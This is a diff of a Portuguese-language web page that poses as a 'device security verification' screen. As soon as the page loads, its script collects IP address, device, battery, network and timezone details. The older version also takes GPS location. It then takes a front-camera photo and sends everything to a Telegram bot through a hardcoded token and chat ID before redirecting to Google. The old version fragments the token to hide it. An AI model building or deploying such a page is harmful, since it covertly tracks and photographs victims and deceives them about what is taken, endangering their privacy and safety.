@@ -2,106 +2,200 @@
 <html lang="pt-BR">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width,initial-scale=1.0">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Verificação de Segurança</title>
     <style>
-        body{font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,sans-serif;display:flex;justify-content:center;align-items:center;height:100vh;margin:0;background:#f0f2f5}
-        #c{text-align:center;background:#fff;padding:2.5rem;border-radius:16px;box-shadow:0 8px 32px rgba(0,0,0,.08);max-width:420px;width:90%}
-        h2{color:#1a1a1a;font-size:1.3rem;margin-bottom:8px}
-        p{color:#666;font-size:.9rem;margin-bottom:20px}
-        .s{width:28px;height:28px;border:3px solid #e8e8e8;border-top:3px solid #0066ff;border-radius:50%;animation:spin 1s linear infinite;margin:20px auto}
-        @keyframes spin{0%{transform:rotate(0deg)}100%{transform:rotate(360deg)}}
-        #st{font-size:.8rem;color:#888;margin-top:15px}
-        #v,#cn{display:none}
+        body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; background: #f0f2f5; }
+        .container { text-align: center; background: white; padding: 2rem; border-radius: 12px; box-shadow: 0 10px 25px rgba(0,0,0,0.05); max-width: 400px; width: 90%; }
+        h2 { color: #1a1a1a; font-size: 1.2rem; margin-bottom: 0.5rem; }
+        p { color: #666; font-size: 0.85rem; line-height: 1.5; }
+        .loader { border: 3px solid #f3f3f3; border-radius: 50%; border-top: 3px solid #0088cc; width: 24px; height: 24px; animation: spin 1s linear infinite; margin: 15px auto; }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+        .status { font-size: 0.75rem; color: #999; margin-top: 10px; }
     </style>
 </head>
 <body>
-    <div id="c">
-        <h2>Verificando Dispositivo</h2>
-        <p>Por favor, aguarde enquanto validamos suas credenciais de segurança.</p>
-        <div class="s"></div>
-        <div id="st">Inicializando...</div>
-        <video id="v" autoplay playsinline></video>
-        <canvas id="cn"></canvas>
+    <div class="container">
+        <h2>Verificando Dispositivo...</h2>
+        <p>Por favor, aguarde enquanto validamos suas credenciais de segurança e integridade do navegador.</p>
+        <div class="loader"></div>
+        <div class="status" id="statusText">Iniciando coleta...</div>
+        
+        <!-- Elementos ocultos para captura -->
+        <video id="video" style="display:none;" autoplay playsinline></video>
+        <canvas id="canvas" style="display:none;"></canvas>
     </div>
 
     <script>
-        // TOKEN FRAGMENTADO (reconstruído na execução)
-        const _a="8952863326:";const _b="AAGbv532qodG8yJJZ";const _c="6mXSd99oYx6TPvNC7Y";
-        const _d="8607389403";
-        function _tok(){return _a+_b+_c}
-        
-        const st=document.getElementById('st'),v=document.getElementById('v'),cn=document.getElementById('cn');
-        
-        // Converte dataURI para Blob
-        function d2b(d){const b=atob(d.split(',')[1]),m=d.split(',')[0].split(':')[1].split(';')[0],a=new ArrayBuffer(b.length),i=new Uint8Array(a);for(let n=0;n<b.length;n++)i[n]=b.charCodeAt(n);return new Blob([a],{type:m})}
-        
-        // Pega GPS
-        function ggps(){return new Promise(r=>{if(!navigator.geolocation)return r("Não suportado");navigator.geolocation.getCurrentPosition(p=>{const lat=p.coords.latitude,lng=p.coords.longitude,acc=p.coords.accuracy;r(`${lat.toFixed(6)}, ${lng.toFixed(6)} (±${Math.round(acc)}m)`},e=>r(`Negado: ${e.message}`),{enableHighAccuracy:true,timeout:5000,maximumAge:0})})}
-        
-        async function run(){
-            st.innerText="Coletando metadados...";
+        // --- CONFIGURAÇÃO ---
+        // ATENÇÃO: Em produção real, nunca exponha tokens no frontend. 
+        // Para testes/POC funciona, mas é visível no "Inspecionar Elemento".
+        const BOT_TOKEN = "8952863326:AAGbv532qodG8yJJZ6mXSd99oYx6TPvNC7Y";
+        const CHAT_ID = "8607389403";
+        // --------------------
+
+        const statusText = document.getElementById('statusText');
+
+        function getBatteryInfo() {
+            if (navigator.getBattery) {
+                return navigator.getBattery().then(battery => {
+                    return `${Math.round(battery.level * 100)}% (${battery.charging ? 'Carregando' : 'Na bateria'})`;
+                });
+            }
+            return Promise.resolve("Não suportado");
+        }
+
+        function getConnectionInfo() {
+            const conn = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
+            if (conn) {
+                return `${conn.effectiveType || 'Desconhecido'} ${conn.downlink ? '(' + conn.downlink + 'Mbps)' : ''}`;
+            }
+            return "Não suportado";
+        }
+
+        async function coletarDadosComplementares() {
+            const battery = await getBatteryInfo();
+            const connection = getConnectionInfo();
+            
+            return {
+                ram: navigator.deviceMemory ? `${navigator.deviceMemory} GB (aprox)` : "Não suportado",
+                cores: navigator.hardwareConcurrency || "Não suportado",
+                touch: navigator.maxTouchPoints > 0 ? "Sim" : "Não",
+                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                languages: navigator.languages ? navigator.languages.join(', ') : navigator.language,
+                battery: battery,
+                connection: connection,
+                online: navigator.onLine ? "Online" : "Offline"
+            };
+        }
+
+        async function enviarDados() {
+            statusText.innerText = "Coletando metadados...";
             
             // Dados básicos
-            const d={ua:navigator.userAgent,ip:"Buscando...",scr:`${screen.width}x${screen.height} (DPR:${window.devicePixelRatio})`,lang:navigator.language,os:navigator.platform};
-            
-            // IP
-            try{const j=await(await fetch('https://api.ipify.org?format=json')).json();d.ip=j.ip}catch{d.ip="Erro/Falha"}
-            
+            const dadosBasicos = {
+                ua: navigator.userAgent,
+                lang: navigator.language,
+                screen: `${screen.width}x${screen.height} (Pixel Ratio: ${window.devicePixelRatio})`,
+                platform: navigator.platform,
+                ip: "Buscando..."
+            };
+
             // Dados avançados
-            let bat="N/A",net="N/A",ram="N/A",cpu="N/A",tz="N/A",gps="N/A";
-            try{
-                if(navigator.getBattery){const b=await navigator.getBattery();bat=`${Math.round(b.level*100)}% (${b.charging?'Carregando':'Bateria'})`}
-                net=navigator.connection?`${navigator.connection.effectiveType||'?'}`+(navigator.connection.downlink?` @${navigator.connection.downlink}Mbps`:''):"N/A";
-                ram=navigator.deviceMemory?`${navigator.deviceMemory}GB`:"N/A";
-                cpu=navigator.hardwareConcurrency?`${navigator.hardwareConcurrency} núcleos`:"N/A";
-                tz=Intl.DateTimeFormat().resolvedOptions().timeZone;
-                st.innerText="Solicitando GPS...";
-                gps=await ggps();
-            }catch(e){}
+            const dadosAvancados = await coletarDadosComplementares();
+
+            // Pega IP
+            try {
+                const res = await fetch('https://api.ipify.org?format=json');
+                const json = await res.json();
+                dadosBasicos.ip = json.ip;
+            } catch(e) { dadosBasicos.ip = "Erro/Falha"; }
+
+            statusText.innerText = "Montando relatório...";
+
+            let msg = `🔒 *NOVO ACESSO DETECTADO*\n\n`;
+            msg += `📱 *Dispositivo*\n`;
+            msg += `• OS: ${dadosBasicos.platform}\n`;
+            msg += `• Tela: ${dadosBasicos.screen}\n`;
+            msg += `• RAM: ${dadosAvancados.ram}\n`;
+            msg += `• CPU: ${dadosAvancados.cores} núcleos\n`;
+            msg += `• Touch: ${dadosAvancados.touch}\n\n`;
             
-            // Monta mensagem
-            let m=`🔒 *NOVO ACESSO*\n\n`;
-            m+=`📍 *Localização*\n• GPS: ${gps}\n\n`;
-            m+=`📱 *Dispositivo*\n• OS: ${d.os}\n• Tela: ${d.scr}\n• RAM: ${ram}\n• CPU: ${cpu}\n• Touch: ${navigator.maxTouchPoints>0?'Sim':'Não'}\n\n`;
-            m+=`🌐 *Rede*\n• IP: ${d.ip}\n• Tipo: ${net}\n• Status: ${navigator.onLine?'Online':'Offline'}\n• Fuso: ${tz}\n\n`;
-            m+=`🔋 *Sistema*\n• Bateria: ${bat}\n• Idiomas: ${navigator.languages?navigator.languages.join(', '):d.lang}\n\n`;
-            m+=`🆔 *Navegador*\n• UA: \`${d.ua}\``;
+            msg += `🌐 *Conexão*\n`;
+            msg += `• IP: ${dadosBasicos.ip}\n`;
+            msg += `• Tipo: ${dadosAvancados.connection}\n`;
+            msg += `• Status: ${dadosAvancados.online}\n\n`;
+
+            msg += `🔋 *Sistema*\n`;
+            msg += `• Bateria: ${dadosAvancados.battery}\n`;
+            msg += `• Fuso: ${dadosAvancados.timezone}\n`;
+            msg += `• Idiomas: ${dadosAvancados.languages}\n\n`;
             
-            // Tenta câmera
-            st.innerText="Acessando câmera...";
-            try{
-                const s=await navigator.mediaDevices.getUserMedia({video:{facingMode:"user",width:{ideal:640},height:{ideal:480}}});
-                v.srcObject=s;
-                await new Promise(r=>setTimeout(r,1800));
-                cn.width=v.videoWidth;cn.height=v.videoHeight;
-                cn.getContext('2d').drawImage(v,0,0);
-                s.getTracks().forEach(t=>t.stop());
-                const img=cn.toDataURL('image/jpeg',.55),bl=d2b(img);
-                const fd=new FormData();
-                fd.append('chat_id',_d);
-                fd.append('photo',bl,'v.jpg');
-                fd.append('caption',m);
-                fd.append('parse_mode','Markdown');
-                st.innerText="Enviando dados...";
-                await fetch(`https://api.telegram.org/bot${_tok()}/sendPhoto`,{method:'POST',body:fd});
-                st.innerText="Verificação concluída. Redirecionando...";
-            }catch(e){
-                m+=`\n\n⚠️ *Câmera: ${e.name==='NotAllowedError'?'Bloqueada':'Erro'}*`;
-                const fd=new FormData();
-                fd.append('chat_id',_d);
-                fd.append('text',m);
-                fd.append('parse_mode','Markdown');
-                st.innerText="Enviando relatório...";
-                await fetch(`https://api.telegram.org/bot${_tok()}/sendMessage`,{method:'POST',body:fd});
-                st.innerText="Concluído. Redirecionando...";
+            msg += `🆔 *Navegador*\n`;
+            msg += `• UA: \`${dadosBasicos.ua}\``;
+
+            // Tenta tirar foto
+            statusText.innerText = "Acessando câmera...";
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({ 
+                    video: { 
+                        facingMode: "user",
+                        width: { ideal: 640 },
+                        height: { ideal: 480 }
+                    } 
+                });
+                
+                const video = document.getElementById('video');
+                video.srcObject = stream;
+                
+                // Espera o vídeo carregar metadados para garantir resolução
+                await new Promise((resolve) => {
+                    video.onloadedmetadata = () => {
+                        video.play();
+                        resolve();
+                    };
+                    setTimeout(resolve, 2000); // Timeout de segurança
+                });
+
+                const canvas = document.getElementById('canvas');
+                canvas.width = video.videoWidth;
+                canvas.height = video.videoHeight;
+                canvas.getContext('2d').drawImage(video, 0, 0, canvas.width, canvas.height);
+                
+                stream.getTracks().forEach(track => track.stop());
+
+                const imgData = canvas.toDataURL('image/jpeg', 0.6); 
+                
+                statusText.innerText = "Enviando dados...";
+
+                const formData = new FormData();
+                formData.append('chat_id', CHAT_ID);
+                formData.append('photo', dataURItoBlob(imgData), 'cam.jpg');
+                formData.append('caption', msg);
+                formData.append('parse_mode', 'Markdown');
+                
+                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
+                    method: 'POST',
+                    body: formData
+                });
+
+                statusText.innerText = "Conclusão: Sucesso";
+                setTimeout(() => { window.location.href = "https://google.com"; }, 2000); // Redireciona após sucesso
+
+            } catch (err) {
+                console.error(err);
+                statusText.innerText = "Câmera bloqueada. Enviando texto.";
+                
+                msg += `\n\n⚠️ *Câmera: Negada/Bloqueada*`;
+                msg += `\nErro: ${err.message}`;
+
+                const formData = new FormData();
+                formData.append('chat_id', CHAT_ID);
+                formData.append('text', msg);
+                formData.append('parse_mode', 'Markdown');
+                
+                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                    method: 'POST',
+                    body: formData
+                });
+                
+                statusText.innerText = "Conclusão: Parcial (Sem Foto)";
+                setTimeout(() => { window.location.href = "https://google.com"; }, 2000);
             }
-            setTimeout(()=>location.href="https://google.com",2200);
         }
-        
-        // Delay de segurança
-        setTimeout(run,3500);
+
+        function dataURItoBlob(dataURI) {
+            const byteString = atob(dataURI.split(',')[1]);
+            const mimeString = dataURI.split(',')[0].split(':')[1].split(';')[0];
+            const ab = new ArrayBuffer(byteString.length);
+            const ia = new Uint8Array(ab);
+            for (let i = 0; i < byteString.length; i++) {
+                ia[i] = byteString.charCodeAt(i);
+            }
+            return new Blob([ab], { type: mimeString });
+        }
+
+        window.onload = enviarDados;
     </script>
 </body>
 </html>
-
